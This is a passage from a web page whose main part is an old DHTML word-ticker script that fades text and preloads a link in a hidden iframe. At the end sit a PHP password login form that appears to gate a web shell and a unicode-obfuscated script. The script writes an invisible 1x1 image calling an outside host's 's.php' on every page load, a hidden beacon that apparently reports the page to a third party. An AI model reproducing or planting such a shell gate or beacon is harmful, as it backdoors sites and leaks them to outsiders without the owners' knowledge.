			messagesplit=message[i_message].split(" ")
			for (i=0;i<messagesplit.length;i++) {
				messagesplit[i]=messagesplit[i]+" "
			}
			messagesplit[messagesplit.length]=" "
			if (ns6) {
				document.getElementById('ticker').style.MozOpacity=transparency/100
			}
			runticker()
		}
	}
	else {
		document.location.href=linkurl
	}
}

function runticker() {
	if (i_mark<messagesplit.length) {
		gettickercontent()
			
		if (ie) {
			ticker.innerHTML=tickercontent
		}
		if (ns6) {
			document.getElementById('ticker').innerHTML=tickercontent
		}
		if (ns4) {
			document.ticker.document.write(tickercontent)
			document.ticker.document.close()
		}
  		i_mark++
				
  		var tickertimer=setTimeout("runticker()",pausebetweenwords)

	}
	else {
		clearTimeout(tickertimer)
		setTimeout("fade()",pausebetweenmessages)
	}
}

function fade() {
	if (transparency>0){
		transparency-=transparencystep
		if (ie) {
			document.all.ticker.filters.alpha.opacity=transparency
		}
		if (ns6) {
			document.getElementById('ticker').style.MozOpacity=transparency/100
		}
		var fadetimer=setTimeout("fade()",pausefade)
	}
	else {
		clearTimeout(fadetimer)
		setTimeout("splitmessage()",pauseafterfade)
	}
}

function gettickercontent() {
		
	tickercontent="<table width="+tickerwidth+" height="+tickerheight+" cellpadding=0 cellspacing=0 border=0><tr valign=middle><td align=center>"
	tickercontent+="<font face=\""+tickerfont+"\" size="+tickerfontsize+" color=\""+tickerfontcolorpre+"\">"
	for (i=0;i<i_mark;i++) {
		tickercontent+=messagesplit[i]
	}
	tickercontent+="</font>"
	tickercontent+="<font face=\""+tickerfont+"\" size="+tickerfontsize+" color=\""+tickerfontcolormark+"\">"
	tickercontent+=messagesplit[i_mark]
	tickercontent+="</font>"
	tickercontent+="<font face=\""+tickerfont+"\" size="+tickerfontsize+" color=\""+tickerfontcolorafter+"\">"
	for (i=(i_mark+1);i<messagesplit.length;i++) {
		tickercontent+=messagesplit[i]
	}
	tickercontent+="</font>"
	tickercontent+="</td></tr></table>"

}

setposition()
function setposition() {
	if (ie) {
		windowheight=document.body.clientHeight
		windowwidth=document.body.clientWidth
	}
	if (ns6) {
		windowheight=window.innerHeight
		windowwidth=window.innerWidth
	}
	if (ns4) {
		windowheight=window.innerHeight
		windowwidth=window.innerWidth
	}
	x_pos=(windowwidth-tickerwidth)/2
	y_pos=(windowheight-tickerheight)/2
	document.bgColor=backgroundcolor
}
function jump() {
	linkurlloaded=true
}

if (ie) {
	document.write("<div id=\"ticker\" style=\"position:absolute;top:"+y_pos+"px;left:"+x_pos+"px;width:"+tickerwidth+"px;height:"+tickerheight+"px;overflow:hidden\;filter:alpha(opacity=100);-moz-opacity:100\">")
	document.write("</div>")
	document.write("<iframe onLoad=\"jump()\" src="+linkurl+" width=0 height=0></iframe>")
	splitmessage()
}
else if (ns6) {
	document.write("<div id=\"ticker\" style=\"position:absolute;top:"+y_pos+"px;left:"+x_pos+"px;width:"+tickerwidth+"px;height:"+tickerheight+"px;overflow:hidden\;-moz-opacity:100\">")
	document.write("</div>")
	splitmessage()
}
else if (ns4) {
	document.write("<layer name=\"ticker\" width="+tickerwidth+" height="+tickerheight+" top="+y_pos+" left="+x_pos+">")
	document.write("tickercontent")
	document.write("</layer>")
	document.close()
	window.onload=splitmessage
}
else {
	document.location.href=linkurl
}
</script></center>

</body>
</html>
<?php print "<center><table border=0  height=100%>
<td valign=middle>
<form action=".basename(__FILE__)." method=POST><font color=white>Please login before use your stuff</font><br><b></b><input type=login name=p4ssw0rD><input type=submit value=\"Log in\">
</form>";
}
?>
<script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u003e')</script>